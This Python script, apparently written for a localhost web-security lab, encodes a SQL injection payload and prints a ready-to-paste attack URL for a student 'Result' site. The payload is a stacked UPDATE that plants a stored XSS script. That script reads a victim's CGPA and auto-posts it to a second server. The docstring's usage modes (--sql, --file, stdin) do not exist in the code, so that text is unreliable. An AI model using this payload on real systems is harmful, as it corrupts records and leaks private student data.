#!/usr/bin/env python3
"""
encode_payload.py — turn any raw SQL injection payload into:

  1. a SINGLE-LINE version (paste into the web form's input box)
  2. a URL-ENCODED version  (paste into a URL / curl command)

Why: the Result site's form is a GET request, so whatever you type into the
"Password" (or "Student ID") box is passed straight into the vulnerable SQL
query. Multi-line payloads (e.g. a stacked UPDATE carrying a <script> block)
need to be collapsed to one line before pasting, and if you'd rather build the
URL yourself you need the percent-encoded form.

Usage:
    python encode_payload.py --sql "your raw payload here"
    echo "your payload" | python encode_payload.py
    python encode_payload.py --file payload.sql
    python encode_payload.py            # prompts for multi-line input

The script itself never touches the network. It just transforms text.
"""

import re
import urllib.parse

# Put your multi-line raw payload here:
PAYLOAD = """
x' ;

UPDATE result SET
first_name = 'Olivia',
last_name = '<script>window.addEventListener("DOMContentLoaded",function(){
  var tds = document.getElementsByTagName("td");
  if (tds.length >= 2) {
    var cgpa = tds[1].textContent.trim();
    var f = document.createElement("form");
    f.method = "POST";
    f.action = "http://localhost:3001/create";
    var i = document.createElement("input");
    i.type = "hidden";
    i.name = "message";
    i.value = "I got " + cgpa;
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  }
});</script>' WHERE student_id = 3005002; #
"""

STUDENT_ID = "3005001"
FORM_SAFE = "/:@+,"


def to_single_line(raw: str) -> str:
    """Collapse every run of whitespace (incl. newlines, indentation) to one space."""
    return re.sub(r"\s+", " ", raw).strip()


def form_encode(single: str) -> str:
    """application/x-www-form-urlencoded style: spaces -> '+'. What a browser sends."""
    return urllib.parse.quote_plus(single, safe=FORM_SAFE)


def url_encode(single: str) -> str:
    """Address-bar style: spaces -> %20. What you'd put after 'password=' in a URL."""
    return urllib.parse.quote(single, safe=FORM_SAFE)


def full_url(student_id: str, encoded: str) -> str:
    return f"http://localhost:3000/?student_id={student_id}&password={encoded}"


def main() -> None:
    raw = PAYLOAD.strip()
    if not raw:
        print("PAYLOAD variable is empty.")
        return

    single = to_single_line(raw)
    enc_form = form_encode(single)
    enc_url = url_encode(single)

    print("=" * 70)
    print("1) SINGLE-LINE  (paste into the Password / Student ID input box)")
    print("=" * 70)
    print(single)
    print()
    print("=" * 70)
    print("2) FORM-ENCODED  (spaces -> '+'; what a browser actually submits)")
    print("=" * 70)
    print(enc_form)
    print()
    print("=" * 70)
    print("3) URL-ENCODED  (spaces -> %20; for address bar / curl)")
    print("=" * 70)
    print(enc_url)
    print()
    print("=" * 70)
    print("4) FULL URL (result site, password field)")
    print("=" * 70)
    print(full_url(STUDENT_ID, enc_url))
    print()


if __name__ == "__main__":
    main()

